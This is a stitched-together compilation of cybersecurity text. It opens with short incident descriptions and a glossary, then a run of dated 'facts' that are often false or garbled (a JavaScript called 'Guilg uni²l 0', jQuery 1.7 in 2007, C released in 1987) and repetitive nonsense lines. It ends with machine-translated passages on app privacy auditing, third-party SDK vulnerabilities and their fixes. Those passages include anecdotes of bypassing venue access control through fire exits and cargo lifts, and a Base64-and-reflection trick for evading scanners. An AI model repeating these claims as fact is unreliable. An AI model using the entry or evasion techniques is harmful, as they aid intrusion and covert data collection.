On June 12th, 2021, a company improved their network security by enforcing password complexity requirements for all users.

On December 3rd, 2020, a university’s computer systems were infected with malware after a student downloaded a file from a malicious website.

On January 20th, 2019, a hospital’s electronic medical record system was compromised by ransomware, disrupting patient care for several hours.

On September 8th, 2020, an attacker penetrated a company’s network through an unsecured Wi-Fi network, allowing them to access confidential data.

On March 17th, 2021, a hacker launched a cyber attack on a bank using a spoofed IP address, making it difficult to trace their location.

On October 9th, 2019, a software engineer with elevated privileges accessed and modified code in a company’s system, causing a critical system failure.

On May 29th, 2021, a phishing attack led to the theft of login credentials for a company’s email server, resulting in the compromise of sensitive information.

On December 1st, 2021, the organization implemented multi-factor authentication to all remote access accounts detecting and preventing successful brute-force attacks.

On June 15th, 2021, a company’s computer systems were infected with ransomware after an employee clicked on a malicious link in an unsolicited email.

On October 3rd, 2020, a power plant’s control system was disrupted by a malware attack causing an explosion leading to unfortunate human injuries and equipment damage.

On September 23rd, 2021, an attacker exploited a vulnerability in the organization’s website’s web server software to inject malicious code resulting in unauthorized data access by the attacker.

On August 4th, 2021, an attacker leveraged IP address spoofing technique to carry out a DDoS attack, causing service disruption for an e-commerce website.

On January 7th, 2020, a rogue employee with administrator access exploited security gaps within the organization’s IT systems, stealing confidential customer information.

On May 12th, 2021, a phishing attack targeted employees in the finance department of a company, with attackers tricking users into installing malware and gaining access to sensitive financial information.

On September 1st, 2021, after a series of data breaches, the company implemented two-factor authentication and password rotation policies to enhance their security posture.”

On December 15th, 2021, attackers used a phishing email that contained a malicious attachment to distribute malware and infect the company’s entire network.

On July 1st, 2020, a ransomware attack on a hospital’s computer system led to the inaccessibility of patient records and halted critical medical procedures for several hours.

On February 1st, 2020, hackers gained unauthorized access to an e-commerce site by exploiting a vulnerability in its outdated payment gateway software.

On October 15th, 2021, an investigation found that a cyber attack on a political campaign came from an IP address owned by a known nation-state hacker group.

On May 1st, 2021, a hacker exploited a privilege escalation vulnerability on a company’s server to gain access as an administrator and stole sensitive customer data.

On August 15th, 2020, a social engineering attack was launched against employees of a financial institution. Attackers used pretexting to trick employees into giving up their login credentials and gain access to sensitive information.


On March 15th, 2021, due to an increase in phishing attacks, our company enforced stricter password policies and implemented multi-factor authentication to ensure secure remote access for employees.

On November 5th, 2022, a company’s website was compromised by a ransomware attack that exploited a vulnerability in a third-party software application.

On August 20th, 2022, a large-scale cyber attack targeted a major healthcare organization, compromising sensitive patient data and disrupting hospital operations.

On January 12th, 2023, a spear-phishing campaign targeted a financial services firm, with attackers using social engineering to trick employees into opening malicious emails and installing malware on their systems.

On June 1st, 2023, a cyber attack on a government agency was traced back to an IP address originating from a foreign state-sponsored hacker group.

On April 2nd, 2024, a cyber criminal exploited a privilege escalation vulnerability, allowing them to gain administrative access and steal confidential information from an enterprise network.

On October 30th, 2022, a distributed denial-of-service (DDoS) attack targeted a major e-commerce website, causing it to become unavailable to customers and resulting in significant lost revenue.

On May 5th, 2023, our company implemented multi-factor authentication to prevent unauthorized access to our systems, requiring employees to use both a password and biometric identification to log in.

On July 17th, 2022, an employee unknowingly downloaded a malicious document attachment from a phishing email, which infected their computer with ransomware and caused a widespread data encryption attack.

On November 12th, 2021, a cyber attack targeted a hospital’s electronic health records system, compromising patient data and disrupting critical medical services.

By exploiting a vulnerability in a web application on February 28th, 2024, hackers were able to access a company’s database and extract sensitive customer information, ultimately leading to a significant data breach.

On October 20th, 2022, forensic analysis of a cyber attack revealed that the hacker used an IP address located in a foreign country to disguise their identity and location during the attack.

On January 14th, 2023, an unauthorized user gained access to a company’s confidential financial documents after exploiting a vulnerability in the system and bypassing standard access controls.

A spear-phishing attack on September 1st, 2024, targeted a senior executive within a company, leading to the theft of sensitive corporate data and potential financial losses.

On March 15th, 2024, after discovering that some employees were sharing their login credentials, our company required all employees to use strong passwords and two-factor authentication to access company resources, ensuring better security.

An unsuspecting employee fell victim to a phishing email on August 10th, 2022, downloading a Trojan that infected the company network and allowed an attacker to remotely install malware and steal sensitive data.

On December 1st, 2021, a supply chain attack against a major software provider led to the exploitation of critical infrastructure, including transportation, banking, and healthcare systems.

By exploiting a zero-day vulnerability in a widely used software program on June 5th, 2023, hackers were able to gain access to customer data from a large online retailer, causing significant financial and reputational damage to the company.

During an investigation in January 2022, it was discovered that a group of hackers used a fake domain name to mimic a legitimate banking portal, leading to a successful phishing attack and the theft of millions of dollars in customer funds.

On April 20th, 2022, a cyber criminal infiltrated a company’s network by gaining access to an employee’s low-level credentials, eventually escalating their privileges and exfiltrating sensitive data.

A distributed denial-of-service (DDoS) attack on September 30th, 2022, flooded a company’s website with traffic, making it unavailable to customers and causing a loss of revenue.

As of June 1st, 2021, our company has implemented multi-factor authentication (MFA) to improve the security of our remote workforce and prevent unauthorized access to sensitive data.

An email sent on April 15th, 2022 with a malicious attachment infected over 100,000 computers worldwide with the Remcos remote access trojan (RAT), leading to significant financial losses and data breaches.

On February 5th, 2021, an advanced persistent threat (APT) group successfully exploited a vulnerability in a US government agency’s IT system, causing a nationwide security breach that affected multiple agencies.

Using a combination of social engineering tactics and compromised employee credentials, a hacker gained access to our company’s financial database on October 20th, 2024, which led to significant fraud and data theft.

A phishing campaign discovered on May 30th, 2025, used fake LinkedIn profiles to lure employees of a major corporation to a spoofed login page, ultimately compromising their credentials and giving hackers access to the company’s sensitive data.

A cyber attack discovered on September 13th, 2023, targeted a pharmaceutical company’s research and development system, allowing the attacker to steal valuable intellectual property after they gained access to an employee’s privileged account.

On November 1st, 2021, a ransomware attack using the Maze variant shut down a major US hospital’s systems, causing disruptions to patient care and forcing the hospital to pay a multimillion-dollar ransom to regain access to their data.

As of June 1st, 2023, all employees must use two-factor authentication protocol to log in to our company’s network and protect against unauthorized access.

On December 15th, 2022, hackers used a watering hole attack to infect visitors to a popular blog with malware that stole sensitive data from their computers.

In February 2019, a cyber attack on a major airline’s reservation system caused widespread disruptions and temporary shutdowns of the system, affecting millions of passengers.

On August 10th, 2021, the cyber attackers used a spear phishing email to target a specific employee of our company, tricking them into opening an infected attachment and compromising the entire network.

On May 30th, 2022, a hacker registered a malicious domain name that closely resembled a legitimate website’s domain, allowing them to carry out a successful phishing attack against the website’s customers.

On September 7th, 2023, the attacker gained access to a system administrator’s account, allowing them to escalate their privileges and move laterally throughout the network.

In April 2022, a cryptojacking attack on our company’s servers caused significant slowdowns and loss of computing resources, resulting in financial losses and lengthy recovery efforts.

As of March 15th, 2022, our company is implementing the use of multi-factor authentication protocol to secure our customer data and prevent unauthorized access.

On October 2nd, 2021, the Emotet malware was delivered via a phishing email disguised as a legitimate document, infecting numerous organizations worldwide.

The ransomware attack on May 12th, 2017, affected over 200,000 computers in 150 countries, including critical infrastructure such as hospitals and government agencies.

In August 2023, a zero-day vulnerability in a widely used software allowed attackers to gain remote code execution on targeted systems.

On July 4th, 2022, the cybercriminals used a domain name similar to our company’s legitimate domain to launch a phishing attack, resulting in many customers unknowingly sharing their login credentials.

On January 1st, 2022, a system administrator’s account was compromised, and the attacker was able to access sensitive data and make unauthorized changes to the system.

On November 7th, 2021, a DDoS attack was launched on a popular gaming website, resulting in hours of downtime and significant financial losses.”

Authentication protocols are used to verify the identity of users and systems. One of the earliest authentication protocols was the Password Authentication Protocol (PAP), developed in the early 1990s. PAP is still used today, but it has largely been supplanted by more secure protocols such as Kerberos and Transport Layer Security (TLS).

The infection method is the way in which malware or other malicious software is delivered to a computer system. One of the most common infection methods is email phishing. In 2004, the MyDoom worm used email attachments to spread rapidly throughout the internet.

The affected system refers to the computer or network that has been compromised by a cyber attack. In 2017, the WannaCry ransomware attack affected hundreds of thousands of computers worldwide, including those used by the UK’s National Health Service (NHS).

The attack vector is the means by which an attacker gains access to a system. Some common attack vectors include exploiting software vulnerabilities and brute force password attacks. In 2019, the BlueKeep vulnerability in Microsoft Windows was exploited by attackers to spread the WannaCry ransomware.

Domain names are used to identify and locate servers on the internet. Phishing attacks often use domain names that are similar to legitimate websites in an attempt to trick users into providing personal information. In 2013, the domain registrar GoDaddy was the victim of a large-scale theft of domain names.

Access level refers to the level of privileges that a user has on a system. In 2016, the Yahoo data breach resulted in the leak of over one billion user accounts, including email addresses and passwords. The attackers were subsequently able to use this information to gain access to Yahoo’s internal systems.

Attack type refers to the method that is used to carry out a cyber attack. Some common attack types include DDoS attacks, malware attacks, and social engineering attacks. In 2020, the SolarWinds supply chain attack used a sophisticated malware attack to compromise multiple US government agencies and private sector companies.

The first version of the HTTPS protocol was released in January 1996.

The first widespread distributed denial-of-service (DDoS) attack was reported in February 2009.

Microsoft Windows Explorer will check your file upload capability using a built-in HTTP server.

A data encryption standard, called Protocol Stack, was published in June 2001.

The first publicly available threat intelligence database was released in December 2013.

The NIST Anti-Spam Rule was released in December 2011.

The popular social media platform Facebook launched its first facial recognition tool in September 2010.

The first mobile payment system, called Apple Pay, was introduced by Apple Inc. in September 2014.

The new coronavirus was first detected in Wuhan, Hubei Province, China, on January 10, 2020.

The first incident of computer malware was reported in March 1990.

The first successful cyber attack was carried out in May 1998.

The US National Security Agency publicly announced its discovery of a new class of cyber-attacks in September 2014.

The first outbreak of the novel coronavirus was reported in December 2019.

The transmission of the novel coronavirus in Hubei Province, China, began in January 2020.

Medical teams began using bodies pooled from a dedicated funeral institution for medical students training at Fudan University and Shanghai Second Hospital to provide COVID-19 patients with artificial organs and tissues on February 11, 2020.

The first case of COVID-19 in Taiwan was reported on February 13, 2020.

New strategies and measures to cope with the epidemic emerged at the meeting of the Group of 20 leaders in March 2020.

In October 2020, the WHO issued guidance urging all countries to introduce temperature checks at border crossing points to detect asymptomatic individuals with COVID-19 and those who are sickening while in transit.

The epidemic has caused billions of dollars of economic losses worldwide, with the loss of thousands of jobs and shutdowns of industries around the world.

The first version of the Adobe Creative Suite was released in March 2004.

The second iteration of the jQuery library, version 1.7, was released in May 2007.

The fourth edition of the GNU General Public License was released on October 1, 1999.

The first iteration of JavaScript, named "Guilg uni²l 0" or simply "G 0," was written on September 24, 1991.

A software update for Microsoft Excel was released in September 2000.

The World Health Organization recommended that countries adopt gender-specific indicators for HIV prevention and control in September 2009.

The World Cup football match between Brazil and Argentina was held in June 2014.

The first version of the iOS operating system was released in June 2007.

The software architecture of the Web server was revised in April 2003.

The first version of the Java programming language was released in March 1993.

The fourth edition of the GNU General Public License was released on October 1, 1999.

The World Health Organization recommended that countries adopt gender-specific indicators for HIV prevention and control in September 2009.

The movie "The Shawshank Redemption" was released in 1994.

The first iteration of JavaScript, named "Guilg uni²l 0" or simply "G 0," was written on September 24, 1991.

A software update for Microsoft Excel was released in September 2000.

The movie "Forrest Gump" was released in 1994.

The first version of the C programming language was released in 1987.

The domain name of "example.com" was registered on January 1, 1995.

The United States Internet Foundation merged with six other internet development organizations in October 2001 to create the Internet Corporation for Assigned Names and Numbers (ICANN).

The first iteration of JavaScript, named "Guilg uni²l 0" or simply "G 0," was written on September 24, 1991.

The domain name "example.com" was registered in September 1996.

A password change request was sent to all users of the website in May 2005.

The fourth edition of the GNU General Public License was released on September 3, 2003.

The organization's access level is low-risk.

An attack vector for SQL DDoS was discovered in March 2007.

The first version of PHP, written by Rasmus Lerdorf, was released on October 15, 1995.

The network is designed for maximum security.

The organization's access level is determined by its level of risk.

The attack vector of the terrorist group was discovered on September 11, 2001.

The network security implemented in 2007 extends to new areas.

The organization's access level is high-risk.

The team discovered an advanced attack vector in January of this year.

The network administrator protected approximately 42% of all known sensitive information.

The organization's access level is medium-risk.

The attack vector of the terrorist group was developed over a period of years to ensure that it could withstand any future cyber threats.

The organization's access level was determined by its access policies and risk tolerance levels.

The organization's attack vector was discovered on February 14, 2023.

The primary attack vector of cybercrime is phishing.

The organization's attack vector was developed over a period of months to ensure that it could withstand any future cyber threats.

The attack vector of the terrorist group was designed to explode at a specific time and place.

The primary attack vector of cybercrime is malware.

The organization's attack vector was discovered on March 7, 2022.

The team's attack vector was discovered on December 29, 2021.

The primary attack vector of cybercrime is malware.

The organization's attack vector was identified by AI in July of this year.

The team's attack vector was discovered through a deep analysis of the enemy's network on May 17, 2021.

For example, the author once found in an enterprise that the weak power well doors on all floors use A locks, which can be easily opened in the form of single hook, and behind the door are multiple switches and server equipment, the risks can be imagined.

Physical infiltration here is the unauthorized access to the target area, which is also an interesting topic unrelated to Cyber Security.

Considering the sensitivity of the topic, the following readers please think it is fiction, if the similarities are pure coincidence.

In the movie "Sherlock on the Plain", the protagonist needs to enter a high-end community tracking target, the community has a more strict access control management, access control card every brush can only enter one person can not follow.

So the protagonist character of a way to get a takeaway clothing, in the name of delivery security to open the door into the community.

XX City Science and Technology Museum, because it is the summer peak to enter the venue need to make an appointment in advance, can not enter today.

I found that on the side of the venue was an office building to which I entered without any obstruction.

The elevator at the corner came to the third floor and went to the walkway where the office building connects to the venue.

At the border stood the security personnel, and I sorted out my expression and walked over generously.

Sure enough, the security personnel did not stop me, their task was to prevent the audience from entering the office area, and the reverse release by default.

So, I entered the venue.

XX City XX hole scenic spot, as the city's famous web celebrity free scenic spot, every holiday will need to row up a long queue to enter.

At this time, some scalpers came over, quietly shouted, "normal row for 1 hour, 100 yuan to go to the VIP channel, 5 minutes can go in."

Because with friends, I paid the money to avoid meaningless queuing.

He took me around and went in within five minutes, but then I realized, wasn't the so-called VIP channel a fire channel.

XX country XX safety conference, the ticket is converted to RMB is particularly expensive, on the first floor is the ticket gate, the staff can only take the escalator on the second floor meeting area.

As a speaker, I have a ticket, but my accompanying friends can't enter it.

At this time, we found a cargo ladder in the corner, take to the second floor to open the fire safety door and directly into the area of the venue.

Although there was no audience breast card, no one was checked in the venue.


These cases all reflect one thing in common, the main gate is a strictly audited area, but for artificial passageways, fire passageways, cargo ladders, underground garages and other "hidden entrances", they are often in weak security areas.

For near source penetration, the closer the target, the more likely to find a problem.

Future development of near source penetration is not a new concept. There have been previous theories of "close source attack" and "physical penetration", but the test objects of near source penetration have increased more wireless communication technology compared to 10 years ago.

That's because as the Internet of Things (IoT) flourish, various forms of smart devices emerge within businesses, such as a Bluetooth keyboard and mouse, wireless printers, smart lighting, smart cameras, smart TVs, smart speakers, and more.

Even in elevators, vending machines, central air conditioners, or other infrastructure, Internet of Things technologies are used, which communicate via Wi-Fi, Bluetooth, ZigBee, NFC, or other wireless technologies.

For enterprises, the characteristics of the Internet of Things devices pose serious security challenges to enterprises.

A wide variety of equipment appearance, equipped with a wide variety of sensor components, using different wireless communication technologies, operating in different operating systems and CPU architectures.

Most of them have fixed security configurations, user interface, or install security software or agents for control.

Traditional security practices, such as firewall, anti-malware or other security solutions in the face of security threat from the Internet of things is not enough, IT managers can only find 40% of the equipment in the enterprise, such as intelligent devices in the blind area of enterprise management vision, let alone how to protect them, and they may have through some form of access to the enterprise Intranet.

For potential attackers, it is conceivable to use these Internet of Things devices as penetration entry points: in 2016, the Bastille team released a vulnerability disclosure about a wireless mouse, wireless keyboard, where attackers can sniff and hijack operational commands from wireless keymice.

In 2017, Tencent Blade Team used drones to penetrate smart buildings and remotely control smart equipment such as lighting, air conditioners, sockets and electric curtains in office buildings.

In 2019, researchers like Takeshi Sugawara, an associate professor at Tokyo Electric Telecommunications University, published a way to attack smart speakers. Researchers change laser intensity at a specific frequency, and smart devices think they have received sounds at a specific frequency to receive instructions.

In 2020, Anstant Lab announced an attack exploit against Bluetooth at the BlackHat conference, where attackers can exploit Bluetooth vulnerabilities in Android devices to steal sensitive information such as user address books, call history, and SMS captcha.

It can be predicted that more and more companies and teams will hope that offensive and defensive exercises such as Red and Blue confrontation can cover the Internet of Things environment of enterprises and explore potential security threats in the near-source environment.

These new needs still need to be met by regular security service teams, which actually requires our penetration test practitioners to master more near-source penetration technology to cope with the relevant offensive and defensive needs.

For a wider range of information security researchers, close-source penetration will also be the best scenario for wireless attack and defense security, Internet of Things security, physical security and social engineering.

Notes shortly before, the author from work given priority to with security research, to join tencent enterprise IT security operation center this closer to the business security team, one of the main motivation is to hope on the wireless security, Internet of things security accumulation defense concept can have the opportunity in the TOP scale of the Internet office scene.

With the improvement of laws and regulations in the protection of personal information on the Internet, the Internet industry pays more and more attention to the protection of user privacy information.

Especially from the beginning of 2019 by the network letter, ministry, the Ministry of Public Security, market supervision bureau four departments jointly set up APP special governance group, the relevant national regulators also strengthen the relevant policy formulation, constantly carry out relevant governance special action, through the criticism, limited rectification, forced way to carry out the personal privacy information.

Here, we choose the APP of major mainstream manufacturers to see what the APP has done in the start and operation process through technical means.

At present, MIUI systems on the market can already show users the visual interface of APP to obtain devices and user-sensitive information.

We are here more precisely prying to the specific code location.

Here, class 11 device information is selected, and the information name and the specific Android api correspondence are shown in Table 1.

IMEI, MAC address, android_id is the unique identifier of the device, base station positioning, GPS for the user geographical location information, sim card information includes IMSI, mobile phone number, operator information, the installation list represents the package name and application name of all installed applications of the device.

Sensors include acceleration sensors, temperature sensors, etc. Different accounts registered for various applications, WiFi contains WiFi name, WiFi mac address, and all WiFi information scanned by the device.

The Bluetooth information includes the Bluetooth address of the device and the Bluetooth device information scanned by the device.

We have downloaded 15 mainstream APP models from the application of Baoan Zhuo application market, including payment, e-commerce, instant chat, local life, map, etc.

The system api hook, in Table 1 when an app calls an api always records the time and the system call stack.

The specific experimental process is as follows: 1. Write the hook module, to record the A P P call stack information according to the corresponding class name, method name and parameter h o o k system api, write all api hook methods in Table 1, package the hook module into an apk file to the phone, and restart the phone to make the hook module take effect.

Install the A P P in Figure 1, open the operation, login, and keep it on the APP homepage for more than 5 minutes. In order to avoid mutual interference between applications, the mobile phone will only install an APP at the same time during the experiment.

Save the h o o k log of the APP during operation, within 5 minutes from the start, exporting it from the phone for analysis.

Analyze the APP running log, mainly including the number of a p i calls in Table 1 and api calls in 5 minutes before not clicking on the consent privacy policy at the first installation.

In terms of the APP privacy policy, AutoNavi obtains a list of user devices installed, but does not specify the collection purpose in the text of the APP Privacy Policy.

According to the Measures, "the purpose, way, scope of the collection and use of personal information are not listed one by one" can be identified as "the purpose, way and scope of the collection and use of personal information".

Pinduoduo, Sina Weibo and QQ obtained mobile sensor information but did not explain the purpose of the collection in the text of the APP privacy policy.

According to the Measures, "the purpose, way, scope of the collection and use of personal information are not listed one by one" can be regarded as "the purpose, way and scope of the collection and use of personal information".

"jingdong privacy policy", "the" TikTok "privacy policy", "baidu" mobile application privacy policy "," Meituan comment privacy policy "," gold privacy policy "does not specify the registered address, according to" App illegal collection and use of personal information from evaluation guide does not conform to the "clear personal information processing rules and user rights and interests".

The text of the privacy policy is not standard, and some of the APP privacy policies do not specify the company registration name and registration address, but this requirement is that the assessment point 9 in the guide clearly explains the basic situation of the APP operators.

Users click to agree to the privacy policy before starting to obtain the device information, such as the mobile phone status, android_id, installed list information has no clear popup permission on most mobile phones, so that the APP can obtain without user consent, so some APP are in the initiative or unaware to obtain such information.

The APP does not express the purpose, way, and scope of collecting the used personal information, which is mainly reflected in the installed application list and sensor information.

These two types of information do not have clear concepts of system permissions, so user authorization on the vast majority of mobile phones.

These two types of information are vaguely defined in terms of "personal information" and "personal sensitive information", especially sensor information. Mobile phone sensors contain many information, such as motion sensors, heartbeat sensors, temperature sensors and so on.

As we all know, one of the focus of application and data security protection is the security of three-party SDK.

As a basic security issue, the SDK is widely used in the APP, which leads to the security issue of the tripartite SDK that may have a more profound impact.

The three-way SDK is widely used in its daily life and contains rich functions, which is very convenient for developers to use directly.

At the same time, it contains a variety of types and information collected information, which also brings many challenges to security analysis.

A S D K test collecting personal privacy information was exposed at 315 in 2020.

The characteristics of the three-way SDK can be simply attributed to four points: sharing APP permission.

SDK includes jar, aar and so, encapsulation has rich functions, and a feature is that you can share APP permissions.

Black box cannot be detected, and developers may pay more attention to whether SDK is easy to use, but developers do not know whether SDK collects user privacy information, whether there are security loopholes, and whether there is malicious behavior.

More attack surface, the introduction of SDK is equal to the introduction of more attack surface, and in our actual tests found to find more security problems of the three-way SDK than the APP itself or self-developed SDK.

With a wide impact, the commonly used SDK installed capacity may be hundreds of millions or one billion yuan. If there is a security problem, it may affect hundreds of millions or billions of users or terminals.

Private or symmetric key is hard-coded.

Illegal collection of the user's personal privacy information.

Clear text transmission of sensitive data.

Unsecure certificate verification.

The WebView is not used properly bypass sandbox restrictions to access application private components.

Download and install the malicious use Permissions abuse.

Components can generally be divided into exported and private components.

Export components can be accessed by any application, private components can only be accessed by their own application, and private components will often have some sensitive operations, such as modifying password, modifying account number, setting password, accessing sensitive data and other operations.

At the same time, developers generally feel that private components are not exposed, so they do not check some input outside the user.

If there is a loophole, it can be a serious threat.

The malicious application itself cannot directly access some private components in the APP, but it passes through a bridge, through some exposed components in the SDK, this exposed component can directly access the private components, thus achieving the principle of bypass.

The SDK security case follows an example, where there are three parts, the first is to export components; the second is to receive external incoming data, and then save as ActivityName; the third start ActivityName, in the current application achieves the result of bypassing the sandbox.

The solution is that exported components that do not have to be closed and strictly verify external inputs.

There are also common Z I P directory crossing vulnerabilities in the SDK.

The path inside this ZIP compression package exists.../ Such a string that the attacker can utilize multiple.../ You can travel somewhere else.

Imagine if the jump somewhere else with the same name that the user wants to load, the file could directly override the latter.

If you overwrite an executable program, this replacement executable program when loaded, can lightly cause a denial of service, heavy can cause code execution vulnerabilities, will seriously harm the user device security.

When considering the solution the most important concern is to make sure there is not inside when ZipEntry takes the absolute path.../, Also check if it is a normal access directory Yes it can be executed and if not the exception needs to be thrown.

Make a summary of these two vulnerabilities.

If there is access to the private path, plus the path crossing, the operation that can be done for the attacker is its imaginary space.

The way this vulnerability may be a little more complicated than the first. First, this is an export component that sets the external incoming data to v0_1 and creating a Message, through JsonObject This Message is not checked.

An attacker can overwrite some executables during plug-in loading to achieve the result of malicious code injection and code execution.

Looking at another category, this is also a big vulnerability; creating http server Socket, in the local APP The server runs when the APP starts, binding to any address and listening to the network port.

In addition, you can execute some powerful commands, such as uploading, downloading files, adding contacts, or even judge whether the phone is Root, and if it is Root, you can silently install more programs.

One risk point of using Socket is weak verification.

Our repair suggestion is to ban the Socket from binding such addresses as 0.0.0.0, instead of binding to 127.0.0.1, and to filter, validate the access data.

There is also a common risk of dynamic loading plug ugins.

Most of the time, SDK will use this way to upgrade itself, and from the case, we can see that although the package name and class name are judged in the loading process, there is no judgment of where the loaded executable program comes from. The attacker can forge the same class name and method name to construct the executable program, resulting in the execution by classloader.

It is recommended that you check the signature information of the APP.

Certain three-party SDK developers will also use some ways to bypass the detection of conventional security tools to gain user privacy.

The hard coding string on the left of the figure above, is a sensitive operation method getLocation used to obtain the user's address information and do Base64 coding, to the right using Base64 to decode, restore to the getLocation method, and then use reflection to call, so as to achieve the purpose of bypassing the detection of conventional security detection tools.

So, how should the three-party SDK ensure safety?First, try not to export components, if you need to set the protection level, and need external incoming data and verify and confirm the identity of the caller.

In terms of communication, we need to prevent the middleman from attack and encrypt the transmission content.

In addition, the data aspects ensure minimum permission and prevent path crossing.

Loaded content to be trusted, you can use the encryption and verification way.

Three-way SDK safety inspection is very important.

Our detection content includes three aspects: the first privacy compliance detection, the second vulnerability detection, and the third malicious behavior detection.

Combined with the work practice, starting from these three dimensions, we can achieve the purpose of ensuring the user application security as far as possible.

In terms of detection, static stain analysis methods can be used.

The stain analysis was performed in three stages.

First is to mark the source point (i. e., sensitive information), then track, follow specific rules to analyze the stain information, and finally detect and record the access path.

For example, for the sandbox bypass, the first need to judge whether the incoming intent.

This is a security risk to opening another component without doing verification.

For the three-way SDK detection process, there is a lot of work to pay attention to, including the safety detection of checklist, reflection call detection, blacklist library construction and safety detection report.

Practice in the S D L So, how does the security detection of the tripartite SDK integrate in the SDL process?First with a brief introduction to SDL.

SDL, a "secure development lifecycle," mainly refers to a development process that reduces development costs while helping developers build more secure software and address security compliance requirements.

In principle, it is required to solve security problems from the source and avoid common security mistakes in the development.

The SDL can be simply divided into three blocks, the first block is the safety training, the second block is the typing process before the SDK is launched, and finally is the emergency response.

Mainly look at the RBI process in Part 2.

In terms of demand assessment, the implementation of functions should not only be considered in the design stage, but also pay attention to safety compliance and whether the safety red line is violated.

The product design stage should analyze the attack surface and conduct threat modeling.

To the implementation stage, you can perform the static security scanning and abandon the unsafe implementation.

In the verification, the A P P after SDK is integrated.

In this way, when the final version of the security is online, you can see the score of the score of APP in the security dimension, if it is lower than the requirements, it can not be online, and also handle the response plan of events.

For mobile terminal security personnel, the difficulty of SDK detection mainly focuses on two aspects, one is the large amount of SDK quantity and frequent iteration, which increases the difficulty of detection work.

The other is how to calculate the input-output ratio well.

The three-way SDK security guarantee process can be closed-loop from four aspects.

The first is the security review, directly in the design or SDK security ability, the introduced SDK introduction stage, performing threat modeling.

The second is to quickly scan the blacklist database, if it is within the blacklist, you need not take over the process.

The third is safe scanning.

Finally, for the important SDK, an artificial expert analysis is recommended.

There are several aspects of the tripartite SDK safety and quality assurance process to pay attention to.

The first is security review, with threat modeling in the initial stage to reduce the security and privacy risks of SDK.

The second is the blacklist detection, and to ensure that the APP access to the SDK is always the latest version, if there is a vulnerability, you need to ensure that the vulnerability patch in time.

The third is the security detection platform and automation, covering the comprehensive scanning results, to discover and help the business party to solve the typical security vulnerabilities in advance, and to avoid a lot of repair and upgrade workload of the business side before the online / final version audit.

At the same time, the scanning results are as detailed as possible to liberate the security team personnel from the redundant work, study better technology, and bring more security experience to users.

Fourth, it is recommended that experts organize key projects to conduct in-depth analysis, develop and reuse the security coding library, and reuse the security coding library to improve consistency, so as to improve work efficiency.

Through the practice of the above three-party SDK safety and quality assurance process, the security of SDK is better guaranteed in the case of less investment to protect the user security of terminals.

As a major application scenario of personal privacy protection, APP will encounter many legal requirements of personal privacy when the APP is launched, as well as the needs of APP's own data protection and security.

At present, many enterprises are building mobile applications, and there is A lot of work every time APP package, so safety detection and repair produce a lot of additional costs, and will face punishment for violations at any time after the release of the market.

Enterprise manual independent investigation and detection will occupy a large number of human resources, and the detection cycle is long, coupled with the problem of SDK, APP developers will introduce SDK to meet the development needs, may use the legal host APP to perform malicious operations or illegal operation, so as to impact the APP security compliance, these problems are difficult to solve in the APP security detection.

At present, APP automation detection is a good choice, can also use the third party commercial products, but the third party products due to the need to adapt and compatible with all the mainstream APP, often not targeted, since the research system partial detection rules can be customized according to their own APP configuration, and according to the national requirements, market changes update at any time, make the detection rules more accurate, more flexible.

APP detection platform architecture in enterprise applications of personal privacy security detection has a relatively great impact on the business, detection problems and repair solutions many design front-end and underlying logic, need and business parties.

And find the process that fits enterprise mobile development, can detect privacy compliance problems in advance to reduce the cost of problem repair and testing packaging consumption.

The security team should find the positioning and entry point of their own roles and the business parties here, and build a reasonable operation mechanism.

The introduction is divided into two modes: docking and release platform for automatic detection, which can realize automatic monitoring and card point mechanism for each release / test task.

Actively test and upload the APK startup task, and manually detect the APP or historical APP.

The construction of the APP unified release platform is more suitable for the enterprise scenarios with more mobile applications. While conducting the centralized management of the application release, you can detect the card points.

Active testing is a mode of providing services and security empowerment. It is necessary to establish some management systems to cooperate in the company to promote the business testing. Testing, such as: clarifying the personal privacy responsibility of the business plan, testing requirements during version update, repair requirements, and summarizing the main functions of the testing system embedded in the testing process.

Covering the SDK fingerprint database, the top ten security vulnerabilities of OWASP Mobile APP and the commonly used manual inspection items for Party B's safety service testing business.

Permission detection detection application privacy compliance, third-party SDK use and personal collection, and compliance of personal information detection string information collection process.

Safety detection: code security detection, network URL detection, virus detection, three-way tool detection, binary file detection, Manifest detection and other compliance detection: automatic identification and reinforcement application to check whether the prescribed reinforcement, code security baseline and configuration baseline detection.

Dynamic detection: The commonly used dynamic detection is realized by xposed and drozer, but the compatibility is relatively general, and the mainstream app will reject such detection, and use Frida to complete the dynamic detection project detection report.

In the detection report, we must attach the location of the problems, help quickly locate the front-end or privacy policy problems, should link the product or legal affairs and other relevant departments to determine the solutions, and do a good job of solution precipitation, follow-up reference to the implementation mechanism and other mechanisms.

Signature Basic Information and Signature HASH for APP alignment signature security status: vulnerability risk for the signature.

Channel testing: Support the mainstream APP market for monitoring the comparison of pirated APP release records: Whether the mainstream market APP is a release platform release, for internal process compliance testing.

Permission detection: security level classification of Android official authority Privacy authority detection: detect whether APK uses and specifically uses network interaction, privacy API, reflection, IO flow, internal communication and other more private interface privacy rights comparison: detect whether privacy permission is declared by privacy policy, establish privacy authority rule library.

SDK detection: detect which three APK integrated commercial SDK,SDK to collect personal information: SDK collected which personal information: SDK information, establish SDK version, fingerprint, collect information rules library SDK privacy comparison: SDK privacy statement whether the SDK, and collect information is accurate S D K vulnerability detection: such as FastJson vulnerability can be warned.
String detection: parse the APK to get all the current APK strings.For detection of sensitive information: sensitive information, mailbox, mobile phone number and other sensitive information privacy policy comparison: whether sensitive information declares sensitive information illegal collection and detection: privacy pop in front of the window, before user authorization, background running time, etc.

Repackaging detection: Determine whether the current APP can be repackaged compliance detection: whether the company's internal reinforcement mechanism is used, whether it can be repackaged pornographic image detection: for the repackaged application, the resource image is identified.

Binary file detection: for Android So files, mainly whether PIE on.

Manifest detection: detect the export of four components, permission control.

Network URL detection: analyze the APK to extract the URL to determine whether the URL has a malicious interface, as required by using the three-party data.

Code security detection: obtain pseudo-J a v a code through APK for rule matching, identify whether there are loopholes and risk situation CWE, such as certificate not verified, WEBView unauthorized access, etc.

Tripartite tool detection: APKiD is used to detect the characteristics of files, such as anti-simulator, reinforcement, and confusion.

Virus detection: To detect whether the APK has malicious behavior, the three-way platform IOS is needed.

Channel testing: test whether the current APP is a appstore version of the APP release record alignment: whether the mainstream market APP is a release platform release, for internal process compliance testing.

Privacy authority detection: Privacy authority detection: judge for Plist file: detect whether privacy authority is declared by privacy policy, and establish privacy authority rule library.

String detection: parse the APK to get all the current APK strings.

For detection of sensitive information: sensitive information, mailbox, mobile phone number and other sensitive information privacy policy comparison: whether sensitive information declares sensitive information illegal collection and detection: privacy pop in front of the window, before user authorization, background running time, etc.

